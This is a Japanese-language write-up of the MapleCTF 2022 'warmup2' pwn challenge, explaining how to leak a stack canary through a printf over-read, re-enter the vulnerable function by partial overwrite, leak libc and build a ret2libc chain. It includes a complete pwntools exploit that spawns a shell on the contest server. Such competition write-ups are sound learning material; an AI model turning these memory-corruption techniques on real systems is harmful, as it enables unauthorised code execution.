# MapleCTF 2022 `warmup2 [pwn]` writeup

## 問題
It's like warmup1, but harder.

`nc warmup2.ctf.maplebacon.org 1337`

実行ファイルが提供される。

## 解法
セキュリティ機構の確認から。

```
[*] '/home/caffeine/ctf/maplectf22/pwn/warmup2/chal'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

warmup1と違ってSSPが有効になっている。
そのほかにもwin関数は削除されている。
しかしながらバイナリ内にBOFは健在で、それどころかread -> printf -> readの順で関数を呼んでくれる。
printfは1回目のreadの入力をエコーするが、buffer overreadが狙える。
これを利用してcanaryをリーク、2回目のreadでvuln()のリターンアドレスをpartial overwriteしてvuln()をもう一度呼び出せば後はret2libcでどうにでもなりそう。

ret2libcについて、イベント中や終了後にdiscordで「libcが配布されていないがミスではないか」と質問している人が何人かいた。
この手のアドレスリークが簡単にできる問題では問題サーバで使用されるlibcが配布されないことがある。
[libc-database](https://libc.rip/)などのオンラインツールを使えば、ある程度libcのバージョンを特定することができる。
これらのツールは、libcの読みだされるアドレスの下位12 bitが必ず0に整列されることを利用して特定を行っている。

## Exploit
1度目のvuln()でcanaryの読み出し -> partical overwriteでvuln()を再起、2度目のvuln()でlibcのアドレスのリーク -> ROPを組んでシェルを取る。

```py
from pwn import *
import sys
import re

elf = ELF("chal")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
# io = process(elf.path)
io = remote('warmup2.ctf.maplebacon.org', 1337)

# gdb.attach(io)

# specify libc ver.
# payload = b'A' * 0x127
# io.sendlineafter(b'name?', payload)
# ret = io.recvuntil(b'A\n')
# ret = io.recvuntil(b'!\n')
# addr_libc_start_main = u64(ret[:6] + b'\x00\x00') - 243
# print(hex(addr_libc_start_main))

payload = b'A' * 0x108
io.sendlineafter(b'name?', payload)

ret = io.recvuntil(b'A\n')
ret = io.recvuntil(b'!\n')

canary = u64(b'\x00' + ret[:7])
saved_rbp = u64(ret[7:-2] + b'\x00\x00')

print('canary: ' + str(hex(canary)))


payload = b'A' * 0x108
payload += p64(canary)
payload += p64(saved_rbp)
payload += b'\xa3'
io.send(payload)

payload = b'A' * 0x127
io.sendlineafter(b'name?', payload)

ret = io.recvuntil(b'A\n')
ret = io.recvuntil(b'!\n')

libc_start_main_addr = u64(ret[:6] + b'\x00\x00') - 243
libc.address = libc_start_main_addr - libc.sym["__libc_start_main"]
pop_rdi_ret_addr = libc.address + 0x23b6a
ret_addr = libc.address + 0x22679
print('libc addr: ' + str(hex(libc.address)))

payload = b'A' * 0x108
payload += p64(canary)
payload += b'A' * 8
payload += p64(ret_addr)
payload += p64(pop_rdi_ret_addr)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(libc.sym["system"])
io.send(payload)

io.interactive()
```

FLAG: 記録し損ねた…